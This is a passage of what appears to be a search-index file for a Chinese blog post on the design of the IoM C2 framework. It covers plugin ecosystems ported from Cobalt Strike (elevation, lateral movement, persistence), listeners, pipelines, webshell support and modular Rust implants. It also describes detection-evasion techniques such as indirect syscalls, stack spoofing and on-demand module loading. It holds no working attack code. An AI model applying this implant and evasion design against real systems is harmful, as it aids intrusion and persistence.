\u5c01\u88c5\u4e86\u5168\u91cf\u7684IoM\u7684\u529f\u80fd\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u4f7f\u7528lua\u5b9e\u73b0\u4e00\u4e2a\u529f\u80fd\u7b49\u4ef7\u7684cli\u7684\u751a\u81f3gui\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u8bed\u8a00\u65e0\u5173\u7684\u62d3\u5c55\u6027","title":"\u8bed\u8a00\u65e0\u5173\u7684\u62d3\u5c55\u6027","text":"<p>IoM\u5728\u6700\u521d\u7684\u8bbe\u8ba1\u4e0a\u60f3\u517c\u5bb9sliver\u7684armory(\u8fd9\u4e2a\u76f8\u5bf9\u7b80\u5355,\u5df2\u7ecf\u5b9e\u73b0), \u4ee5\u53cacobaltstrike\u7684<code>agressor_script</code>, \u5e76\u5728\u6b64\u57fa\u7840\u4e0a\u63d0\u4f9b\u81ea\u5df1\u7684\u63d2\u4ef6\u751f\u6001\u89c4\u8303, \u63d0\u4f9b\u8bed\u8a00\u65e0\u5173\u7684\u63d2\u4ef6\u89c4\u8303.</p> <p>\u7b80\u5355\u6765\u8bf4, \u5c31\u662f\u652f\u6301lua, go, python, java\u751a\u81f3\u662fyaklang\u7b49\u7b49\u4efb\u610f\u8bed\u8a00\u8fdb\u884c\u62d3\u5c55.</p> <p>(\u5f53\u7136\u6211\u4eec\u4e0d\u6253\u7b97\u4e5f\u6ca1\u6709\u8d44\u6e90\u5b9e\u73b0\u4e00\u5957\u7c7b\u4f3cyaklang\u7684VM, \u53ea\u80fd\u901a\u8fc7\u5728rpc\u4e0a\u7684\u89c4\u8303\u5b9e\u73b0\u591a\u8bed\u8a00SDK)</p> <p>\u5728 https://github.com/chainreactors/mals \u5b9e\u73b0\u4e86\u4e2d\u95f4\u7ed3\u6784\u4f53\uff0c\u80fd\u901a\u8fc7\u4e0d\u540c\u7684\u8bed\u8a00\u66b4\u9732\u540c\u4e00\u5957SDK\uff0c \u76ee\u524d\u4ee5lua\u4e3a\u4e3b\u8981\u7684\u62d3\u5c55\u8bed\u8a00\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#client","title":"client","text":"<p>\u4e0eCobaltStrike\u7684agressor_script\u7c7b\u4f3c, \u4e0d\u8bba\u662fServer\u7684rpc, Listener\u7684Parser, Implant\u7684module, \u90fd\u9700\u8981\u6700\u7ec8\u66b4\u9732\u5728\u63d2\u4ef6\u5f00\u53d1\u8005\u624b\u4e2d. </p> <p>agressor_script \u662f\u57fa\u4e8esleep\u8bed\u8a00\u5b9e\u73b0, sleep\u8f83\u5f3a\u4f9d\u8d56\u4e8ejava. \u5e76\u4e14\u4e5f\u8f83\u4e3a\u5c0f\u4f17, \u8981\u4e0d\u662fCS\u4f30\u8ba1\u5f88\u5c11\u6709\u4eba\u4e86\u89e3\u5b83. IoM\u6682\u65f6\u4e0d\u60f3\u80cc\u4e0a\u5df2\u6709\u7684\u5305\u88b1, \u5148\u653e\u5f00\u624b\u811a\u5927\u80c6\u8bbe\u8ba1, \u6240\u4ee5\u5bf9agressor_script\u517c\u5bb9\u7684\u4f18\u5148\u7ea7\u5728\u5b9e\u73b0\u6211\u4eec\u81ea\u5df1\u63d2\u4ef6\u751f\u6001\u4e4b\u540e. </p> <p>IoM\u9009\u62e9\u4e86lua\u4e0eTCL\u4f5c\u4e3a\u7b2c\u4e00\u9636\u6bb5\u51c6\u5907\u517c\u5bb9\u7684\u5d4c\u5165\u5f0f\u811a\u672c\u8bed\u8a00, lua/TCL\u811a\u672c\u4e0e<code>mal manifest</code>\u7ec4\u6210IoM\u63d2\u4ef6\u5305\u7684\u5355\u5143, \u5728client\u7aef\u63d0\u4f9b<code>mal</code>\u63d2\u4ef6\u7684.</p> <p>\u53ea\u9700\u8981\u5c06\u6240\u6709\u7684rpc\u5305\u88c5\u4e3abuildin\u51fd\u6570, \u6ce8\u518c\u5230lua/TCL\u4e2d, \u7136\u540e\u63d0\u4f9b\u4e00\u4e2a\u5305\u7ba1\u7406\u5668, \u7528\u6765\u7ba1\u7406\u52a0\u8f7d\u987a\u5e8f\u4e0e\u4f9d\u8d56\u5173\u7cfb. \u5f88\u7b80\u5355\u5c31\u80fd\u5b9e\u73b0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u811a\u672c\u8bed\u8a00. </p> <p>\u4f46\u8981\u548cclient\u7684tui\u4ee5\u53ca\u672a\u6765\u53ef\u80fd\u51fa\u73b0\u7684gui\u4ea4\u4e92, \u8fd8\u9700\u8981\u591a\u505a\u4e00\u6b65. \u521a\u624d\u662f\u5c06rpc\u6ce8\u518c\u5230lua/TCL\u4e2d, \u73b0\u5728\u9700\u8981\u5c06\u7528\u6237\u811a\u672c\u7684\u6307\u5b9a\u89c4\u5219\u7684\u51fd\u6570\u53cd\u5411\u6ce8\u518c\u5230client\u7684\u547d\u4ee4, \u6216\u8005gui\u7684\u7ec4\u4ef6. </p> <p>\u6700\u7ec8\u6548\u679c\u5c31\u7c7b\u4f3cCS\u7684<code>agressor_script</code>\u7684\u8868\u8fbe\u529b. </p> <p>\u5f53\u7136, \u8fd9\u91cc\u9762\u8fd8\u6709\u5f88\u591a\u7ec6\u8282. \u4f8b\u5982\u6570\u636e\u4f20\u8f93\u683c\u5f0f, \u53c2\u6570\u4f20\u8f93\u683c\u5f0f\u7b49 \u9700\u8981\u6839\u636e\u5bf9\u5e94\u7684\u811a\u672c\u8bed\u8a00\u9002\u914d. </p> <p>\u540e\u7eed\u8fd8\u5c06\u63d0\u4f9b\u72ec\u7acb\u7684mals\u5ba2\u6237\u7aef\uff0c\u7c7b\u4f3c\u4e00\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c\u80fd\u4e4b\u95f4\u901a\u8fc7mals\u652f\u6301\u7684\u8bed\u8a00\u76f4\u63a5\u63a7\u5236implant\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u63d2\u4ef6\u7d22\u5f15\u4e0e\u63d2\u4ef6\u4ed3\u5e93","title":"\u63d2\u4ef6\u7d22\u5f15\u4e0e\u63d2\u4ef6\u4ed3\u5e93","text":"<p>\u5728v0.0.3\u53d1\u5e03\u540e, \u7ecf\u8fc7\u4e86\u4e00\u6bb5\u65f6\u95f4\u7684\u8fed\u4ee3\uff0c\u73b0\u5728\u5df2\u57fa\u672c\u5b9e\u73b0\u4e86\u8ba1\u5212\u4e2d\u7684\u4e00\u671f\u5de5\u7a0b\u3002 </p> <p>\u6211\u4eec\u4eceCobaltStrike\u8fc1\u79fb\u4e86\u6570\u767e\u4e2a\u4e0d\u540c\u7684\u63d2\u4ef6\u4f5c\u4e3a\u5143\u80fd\u529b, \u8fd9\u4e9b\u63d2\u4ef6\u5c06\u4f1a\u968f\u7740v0.1.0\u540c\u65f6\u53d1\u5e03</p> <ul> <li>community-lib ,\u5de5\u5177\u5e93, \u53ef\u4ee5\u5f53\u4f5c\u5e93\u88ab\u5176\u4ed6\u63d2\u4ef6\u4f7f\u7528<ul> <li>sharpblock</li> <li>No-Consolation</li> </ul> </li> <li>community-common, \u5e38\u7528\u5de5\u5177\u5305<ul> <li>OperatorsKit</li> <li>CS-Remote-OPs-BOF</li> <li>CS-Situational-Awareness-BOF</li> <li>chainreactor\u5de5\u5177</li> <li>misc \u672a\u5206\u7c7b\u7684\u5e38\u7528\u5de5\u5177\u96c6\u5408</li> <li>......</li> </ul> </li> <li>community-elevate \u63d0\u6743\u5de5\u5177\u5305</li> <li>community-proxy \u4ee3\u7406\u5de5\u5177\u5305</li> <li>community-move \u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u5305</li> <li>community-persistence \u6743\u9650\u7ef4\u6301\u5de5\u5177\u5305</li> </ul> <p>\u540c\u65f6\uff0c \u6211\u4eec\u4e5f\u5728client\u4e0a\u5b9e\u73b0\u4e86\u5168\u81ea\u52a8\u4e0b\u8f7d\u5b89\u88c5\u7684\u529f\u80fd\uff0c\u53ea\u9700\u8981\u5728mals\u7684\u7d22\u5f15\u4e2d\u6dfb\u52a0\uff0c \u5c31\u80fd\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u81ea\u52a8\u4e0b\u8f7d\u5b89\u88c5\u3002 </p> <p>\u4f8b\u5982: <code>mals install community-common</code></p> <p>\u901a\u8fc7mal\u652f\u6301\u7684lua/yaegi(golang)\u7b49\u811a\u672c\u8bed\u8a00\uff0c \u80fd\u4ee3\u66ffclient\u64cd\u4f5cIoM\u7684\u5404\u79cd\u529f\u80fd\uff0c\u5e76\u5f62\u6210\u53ef\u590d\u7528\u7684\u63d2\u4ef6\u5305</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#server\u7aef","title":"Server\u7aef","text":""},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#sdk","title":"SDK","text":"<p>\u4e4b\u524d\u63d0\u5230\u8fc7, server\u4e0eclient\u7684\u4ea4\u4e92\u5168\u90fd\u901a\u8fc7grpc\u63d0\u4f9b\u7684rpc. </p> <p>\u901a\u8fc7grpc+protobuf\u63d0\u4f9b\u7684\u4e2d\u95f4\u5c42\uff0c \u6211\u4eec\u53ef\u4ee5\u751f\u6210\u591a\u8bed\u8a00\u7684RPC\u4ee3\u7801\u3002 \u8fd9\u4e2aRPC\u672c\u8eab\u5df2\u7ecf\u5b9e\u73b0\u4e86SDK\u9700\u8981\u768490%\u7684\u529f\u80fd\uff0c \u6211\u4eec\u7684client\u672c\u8d28\u4e0a\u4e5f\u662f\u57fa\u4e8e\u81ea\u52a8\u751f\u6210\u7684golang\u4ee3\u7801\u8fd0\u4f5c\u7684\uff0c \u6211\u4eec\u7684GUI\u5219\u662f\u81ea\u52a8\u751f\u6210\u7684javascript\u4ee3\u7801\u8fd0\u4f5c\u7684\uff0c\u6211\u4eec\u751a\u81f3\u6ca1\u6709\u8fdb\u884c\u591a\u5c11\u989d\u5916\u7684\u5de5\u4f5c\u5c31\u80fd\u5b9e\u73b0\u591a\u79cd\u8bed\u8a00\u7684\u8c03\u7528\u3002</p> <p>\u76ee\u524d\u6211\u4eec\u57fa\u4e8egolang\u548cjavascript\u5206\u522b\u5b9e\u73b0\u4e86TUI\u4e0eGUI\uff0c \u540e\u7eed\u6211\u4eec\u4f1a\u5c06\u76f8\u5173\u7684\u4ee3\u7801\u5c01\u88c5\u4e3aSDK\uff0c \u63d0\u4f9b\u57fa\u4e8egrpc+protobuf\u5b9e\u73b0\u7684\u591a\u8bed\u8a00SDK\u3002 \u521d\u6b65\u8ba1\u5212\u4e2d\uff0c \u6211\u4eec\u4f1a\u63d0\u4f9b\u4e09\u79cd\u8bed\u8a00\u7684SDK\uff0c \u5206\u522b\u662f:</p> <ul> <li>golang</li> <li>javascript</li> <li>python</li> </ul> <p>\u5bf9\u4e8e\u5176\u4ed6\u8bed\u8a00\uff0c\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u4f7f\u7528\u6211\u4eec\u7684 https://github.com/chainreactors/proto \u4ed3\u5e93\u5b89\u88c5\u5bf9\u5e94\u8bed\u8a00\u7684\u63d2\u4ef6\u751f\u6210\u4ee3\u7801\u5373\u53ef\u3002\u552f\u4e00\u7684\u9ebb\u70e6\u70b9\u5c31\u662f\u81ea\u884c\u7f16\u5199grpc+MTLS\u7684\u521d\u59cb\u5316\u8ba4\u8bc1\u6d41\u7a0b\u3002</p> <p>SDK\u4e0emals\u4e0d\u540c\u7684\u5730\u65b9\u5728\u4e8e\uff0c mals\u7ecf\u8fc7\u4e86\u4e00\u5c42\u5c01\u88c5\uff0c \u62e5\u6709\u66f4\u597d\u7684\u7528\u6237\u4f53\u9a8c\uff0c \u7279\u522b\u662f\u5728implant\u64cd\u4f5c\u4e0a\u7684\u76f8\u5173\u51fd\u6570\u3002 </p> <p>\u800cSDK\u662f\u539f\u59cb\u7684rpc\u63a5\u53e3\uff0c\u4ee3\u7801\u5373\u6587\u6863\uff0c \u9700\u8981\u4e00\u5b9a\u7a0b\u5ea6\u53c2\u8003rpc\u7684\u4ee3\u7801\u5b9e\u73b0\u53bb\u8c03\u7528\u3002 </p> <p>\u901a\u8fc7grpc\u652f\u6301\u7684\u4efb\u610f\u8bed\u8a00\uff0c \u90fd\u80fd\u5feb\u901f\u751f\u6210\u5bf9\u5e94\u8bed\u8a00\u7684SDK\uff0c\u5e76\u4e0eIoM\u8fdb\u884c\u4ea4\u4e92</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#listener","title":"Listener","text":"<p>\u5982\u679c\u9605\u8bfb\u8fc7\u6211\u4eec\u7684\u8bbe\u8ba1\u7684\u6587\u6863\u6216\u8005\u84dd\u56fe, \u5e94\u8be5\u77e5\u9053IoM\u4e00\u76f4\u5c06webshell\u5217\u5728\u8ba1\u5212\u4e2d. \u90a3IoM\u8ba1\u5212\u5982\u4f55\u5b9e\u73b0webshell\u5462?</p> <p>\u5b9e\u9645\u4e0a\u5c31\u662f\u5728Listener\u4e2d\u505a\u6587\u7ae0. \u5047\u8bbeIoM\u5c1d\u8bd5\u517c\u5bb9\u51b0\u874e, \u90a3\u4e48\u5b9e\u9645\u4e0a\u5c31\u662f\u9700\u8981\u4e00\u4e2a\u51b0\u874e\u7684\u52a8\u6001\u6570\u636e\u751f\u6210\u5668\u548c\u89e3\u91ca\u5668. \u5bf9\u4e8e\u9ed8\u8ba4\u7684implant(malefic)\u4e5f\u662f\u4e00\u6837, \u901a\u8fc7protobuf, \u5c06message\u5e8f\u5217\u5316\u6210bytes, \u5c06bytes\u89e3\u6790\u4e3amessage. </p> <p>\u8fd9\u91cc\u5c31\u53ef\u4ee5\u5c06\u5176\u53d8\u6210\u62bd\u8c61\u63a5\u53e3:</p> <ul> <li>parser \u8d1f\u8d23\u89e3\u6790\u56de\u4f20\u6570\u636e</li> <li>generator \u5c06spite\u8f6c\u4e3a\u76ee\u6807\u80fd\u7406\u89e3\u7684\u6570\u636e</li> </ul> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u5f97\u66f4\u591a, \u8fd9\u4e2a\u529f\u80fd\u4e5f\u662f\u4e3a\u4e86\u7b2c\u4e09\u65b9C2\u7559\u7684. </p> <p>\u5982\u679c\u6709\u5927\u4f6c\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u4e2aC2, \u4f46\u662f\u51fa\u4e8e\u5de5\u4f5c\u91cf\u4e0e\u65f6\u95f4\u7684\u5173\u7cfb, cli/gui\u5199\u5f97\u975e\u5e38\u7c97\u7cd9\u600e\u4e48\u529e?</p> <p>\u5f88\u7b80\u5355, \u53ef\u4ee5\u5b8c\u5168\u4e0d\u78b0implant ,\u53ea\u9700\u8981\u5728listener\u4e2d\u6dfb\u52a0\u4e00\u4e2aparser\u4e0egenerator. \u5373\u53ef\u8ba9IoM\u7684server/listener/client\u4e09\u7aef\u7684\u751f\u6001\u8fc1\u79fb\u5230\u81ea\u5b9a\u4e49C2\u4e2d.</p> <p>\u5f53\u7136\u8981\u5b9e\u73b0\u65e0\u7f1d\u8fc1\u79fb\u8fd8\u662f\u9700\u8981\u4e00\u4e9b\u57fa\u672c\u7684\u5de5\u4f5c\u7684. \u4f8b\u5982\u652f\u6301Bof\u76f8\u5173\u529f\u80fd\u5f97implant\u539f\u672c\u5c31\u6709\u5bf9Bof\u7684\u652f\u6301. </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#pipeline","title":"Pipeline","text":"<p>pipeline\u76f8\u5f53\u4e8e\u4f20\u7edf\u7684C2\u6846\u67b6\u4e2d\u7684Listener\u3002 IoM\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e86\u5176\u5185\u90e8\u5b9e\u73b0\uff0c \u6211\u4eec\u5c06\u76d1\u542c\u670d\u52a1\u5668\u6574\u4f53\u4f5c\u4e3alistener\uff0c \u6bcf\u4e2alistener\u4e0a\u90fd\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2apipeline\uff0c pipeline\u662f\u4e0eimplant\u8fdb\u884c\u5177\u4f53\u4ea4\u4e92\u7684\u7ec4\u4ef6\u7684\u3002</p> <p>\u8fd9\u91cc\u7684\u4ea4\u4e92\u6307\u7684\u662f:</p> <ul> <li>beacon \u6a21\u5f0f\u4e0b\u89e3\u6790\u5bf9\u5e94\u7684\u5fc3\u8df3\u5305\u5e76\u8fd4\u56de\u6570\u636e</li> <li>bind/webshell \u6a21\u5f0f\u4e0b\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u4e3b\u52a8\u53d1\u5305</li> <li>website \u63d0\u4f9bhttp\u670d\u52a1\u7528\u6765\u5206\u53d1\u6587\u4ef6\u6216\u8005\u6c34\u5751</li> <li>rem \u63d0\u4f9b\u4ee3\u7406\uff0c\u7aef\u53e3\u8f6c\u53d1\uff0c\u6d41\u91cf\u4e2d\u8f6c\u7b49\u6d41\u91cf\u670d\u52a1</li> <li>...</li> </ul> <p>pipeline\u6bd4\u8d77Cobaltstrike\u7684listener\u7684\u8bbe\u8ba1\u66f4\u52a0\u7075\u6d3b\uff0c\u5e76\u4e14\u62e5\u6709\u66f4\u4e30\u5bcc\u7684\u529f\u80fd\u3002 </p> <p>\u5b9e\u9645\u4e0alistener\u63d0\u4f9b\u4e86\u5206\u5e03\u5f0f\u5c42\u9762\u7684\u62bd\u8c61\uff0c pipeline\u5219\u662f\u5176\u5177\u4f53\u5b9e\u73b0\uff0c \u4e24\u8005\u76f8\u8f85\u76f8\u6210\u3002</p> <p>\u901a\u8fc7\u5b9e\u73b0pipeline\u7684\u57fa\u672c\u63a7\u5236rpc\uff0c \u5c31\u53ef\u4ee5\u63a5\u5165\u4e0d\u540c\u5f62\u5f0f\u7684pipeline\uff0c \u4f8b\u5982\u4e91\u51fd\u6570, \u4ee3\u7406, LOLC2 \u7b49\u7b49</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#parser","title":"Parser","text":"<p>\u6bd4pipeline\u66f4\u52a0\u7ec6\u8282\u7684\u5b9e\u73b0\u662fparser\uff0c parser\u63d0\u4f9b\u4e86\u5177\u4f53\u534f\u8bae\u5b9e\u73b0\u7684\u62bd\u8c61\u3002\u4f8b\u5982malefic\u9ed8\u8ba4\u7684\u901a\u8baf\u534f\u8bae\u662f\u8fd9\u6837\u7684:</p> <pre><code>graph TD\n    subgraph TLS\n        subgraph Encryption\n            subgraph \u5185\u90e8\u7ed3\u6784\n                ProtocolHeader[Protocol Header]\n                Protobuf[Protobuf]\n            end\n        end\n    end</code></pre> <p>\u901a\u8fc7\u4fee\u6539parser\uff0c \u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u4f20\u8f93\u534f\u8bae\u683c\u5f0f\u3002 \u66f4\u53ef\u4ee5\u901a\u8fc7parser\uff0c \u5c06\u5176\u4ed6C2\u6846\u67b6\u63a5\u5165\u5230IoM\u4e2d\uff0c \u53c8\u6216\u8005\u5c06IoM\u4f5c\u4e3a\u5176\u4ed6C2\u6846\u67b6\u7684external listener\u3002</p> <p>\u901a\u8fc7\u5b9a\u5236\u4e0d\u540c\u7684parser\uff0c\u53bb\u9002\u914d\u4e0d\u540c\u7684C2 implant\u3002 \u53ef\u4ee5\u5c06\u534f\u8bae\u5b8c\u5168\u4e0d\u540c\u7684C2\u63a5\u5165\u5230IoM\u4e2d\uff0c \u4e5f\u53ef\u4ee5\u5c06IoM\u4f5c\u4e3a\u4e0d\u540cC2\u7684redirecter</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#implant\u7aef","title":"Implant\u7aef","text":"<p>implant \u7aef\u7684\u62d3\u5c55\u6027\u662f\u91cd\u4e2d\u4e4b\u91cd\u3002 \u6211\u4eec\u8ba1\u5212\u4e2d\u5c06\u652f\u6301\u5bf9\u7f16\u8bd1\uff0c\u94fe\u63a5\uff0c\u529f\u80fd\uff0c\u9759\u6001\uff0c\u52a8\u6001\uff0c\u5185\u5b58\uff0c\u6d41\u91cf\u7b49\u7b49\u65b9\u65b9\u9762\u9762\u8fdb\u884c\u91cd\u8f7d\uff0c\u81ea\u5b9a\u4e49\uff0c\u53ef\u62d3\u5c55\u3002</p> <p>\u76f8\u5173\u4ee3\u7801\u53ef\u4ee5\u5728github\u4ed3\u5e93\u4e2d\u627e\u5230: https://github.com/chainreactors/malefic</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#features","title":"features","text":"<p>rust\u6700\u5f3a\u5927\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7ec6\u7c92\u5ea6\u6781\u9ad8\u7684\u6761\u4ef6\u7f16\u8bd1\u7684\u8bed\u6cd5\u7cd6\u4ee5\u53ca\u66f4\u5f3a\u5927\u7684\u8fc7\u7a0b\u5b8f\uff08\u7f16\u8bd1\u65f6\u5c55\u5f00\u7684\u5b8f\uff09\uff0c \u8ba9\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u7b80\u5355\u7684\u5b9e\u73b0\u975e\u5e38\u590d\u6742\u7684\u5404\u81ea\u62d3\u5c55\u529f\u80fd\u3002 </p> <p>\u73b0\u5728malefic\u7684\u7edd\u5927\u90e8\u5206\u62d3\u5c55\u80fd\u529b\u90fd\u662f\u57fa\u4e8efeatures\u6784\u5efa\u7684\uff0c \u5e76\u63d0\u4f9b\u4e86malefic-mutant\u5c06<code>config.yaml</code>\u8f6c\u4e3a\u914d\u7f6e\u597d\u7684cargo.toml\u3002 </p> <p>\u53ef\u4ee5\u5728 https://github.com/chainreactors/malefic/blob/master/malefic-modules/src/lib.rs \u770b\u5230\u4e00\u4e2a\u6bd4\u8f83\u76f4\u89c2\u7684\u4f8b\u5b50\u3002 \u6211\u4eec\u901a\u8fc7feature\u5b9e\u73b0\u4e86module\u7684\u52a8\u6001\u6309\u9700\u7ec4\u88c5\u3002</p> <p>\u901a\u8fc7\u63a7\u5236\u4e0d\u540c\u7684features\u7684\u7ec4\u5408\uff0c\u53ef\u4ee5\u5c06IoM implant\u62c6\u89e3\u4e3a\u4e50\u9ad8\u79ef\u6728\uff0c \u7f16\u8bd1\u65f6\u52a8\u6001\u62fc\u88c5</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#kits","title":"kits","text":"<p>kit\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5de5\u5177\u5305\uff0c \u7528\u6765\u5b9e\u73b0\u5404\u81ea\u8fdb\u9636\u529f\u80fd\uff0c \u5e76\u7531\u6211\u4eec\u6765\u7ef4\u62a4\u5176opsec\u4e0e\u7a33\u5b9a\u6027\u3002\u5728\u6bcf\u4e2a\u7248\u672c\u53d1\u5e03\u65f6\u4f1a\u901a\u8fc7 <code>.a/.lib</code> \u53d1\u5e03\u5bf9\u5e94\u7684\u9759\u6001\u94fe\u63a5\u5e93, \u4e5f\u662f**\u76ee\u524dIoM\u4e2d\u552f\u4e00\u4e0d\u5b8c\u5168\u5f00\u6e90**\u7684\u7ec4\u6210\u90e8\u5206\u3002 </p> <p>\u76ee\u524d\u6211\u4eec\u53ea\u63d0\u4f9b\u4e86win-kit , \u5176\u4e2d\u5305\u542b\u4e86\u5341\u6570\u4e2a offensive security \u7684\u529f\u80fd\uff0c \u5305\u62ec  BOF, CLR, indirect syscall, stack spoof\u7b49\u7b49.</p> <p>\u8fd9\u90e8\u5206\u662f\u7531\u6211\u4eec\u7ef4\u62a4\u7684\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\uff0c\u6211\u4eec\u5c06\u4f1a\u4e3a\u4e0d\u540c\u7684\u4f7f\u7528\u573a\u666f\u76ee\u6807\u7528\u6237\u5b9a\u5236\u4e0d\u540c\u7684kit,  \u514d\u53bbC2\u5f00\u53d1\u4e2d\u6700\u4e3a\u590d\u6742\u7684\u6280\u672f\u7ec6\u8282\uff0c \u66b4\u9732\u76f4\u63a5\u53ef\u4ee5\u8c03\u7528\u7684\u73b0\u6210api</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#module","title":"module","text":"<p>\u8be6\u60c5\u53ef\u89c1: https://chainreactors.github.io/wiki/IoM/manual/implant/#dynamic-module</p> <p>\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u73b0\u4ee3\u5316\u7684\u8bbe\u8ba1, \u4e0d\u9700\u8981\u7684\u529f\u80fd\u5c31\u4e0d\u8981\u6253\u5305\u8fdb\u6765, \u4e0d\u5b58\u5728\u5c31\u65e0\u4ece\u67e5\u6740. \u53ea\u5728\u9700\u8981\u65f6\u52a0\u8f7d\u9700\u8981\u7684\u529f\u80fd, \u80fd\u5728\u4f53\u79ef, \u7279\u5f81\u4e0a\u505a\u5230\u6700\u5c0f\u5316. </p> <p>\u8fd9\u91cc\u7684\u5177\u4f53\u5b9e\u73b0\u65b9\u6848\u5f88\u591a, \u4f8b\u5982Havoc, \u5b83\u662f\u901a\u8fc7\u5927\u91cf\u7684BoF\u5c06\u5927\u91cf\u57fa\u7840\u529f\u80fd\u8f6c\u4e3a\u63d2\u4ef6, Sliver\u5219\u662f\u901a\u8fc7\u81ea\u5b9a\u4e49\u683c\u5f0f\u7684extension\u5b9e\u73b0\u4e86dll+bof.</p> <p>\u800cIoM\u4e2d\u9009\u62e9\u4e86\u66f4\u52a0opsec\u7684\u65b9\u5f0f, \u901a\u8fc7headlessPE\u7684\u65b9\u5f0f, \u52a8\u6001\u52a0\u8f7d\u6a21\u5757, \u5c31\u50cf\u6b63\u5e38\u52a0\u8f7dDLL\u4e00\u6837, \u5c06\u6309\u7167\u63a5\u53e3\u89c4\u8303\u7f16\u5199\u7684\u6a21\u5757\u70ed\u52a0\u8f7d\u8fdb\u6765. \u751a\u81f3\u8fd9\u4e2a\u529f\u80fd\u672c\u8eab\u4e5f\u662f\u53ef\u4ee5\u62c6\u5378\u6389\u7684, \u53ef\u4ee5\u9009\u62e9\u53ea\u4fdd\u7559\u4e0a\u4f20,\u4e0b\u8f7d\u548cexec\u7684mini implant, \u751a\u81f3\u53ea\u4fdd\u7559loader implant\u7684nano implant.</p> <p>\u901a\u8fc7\u5b9a\u5236module\uff0c 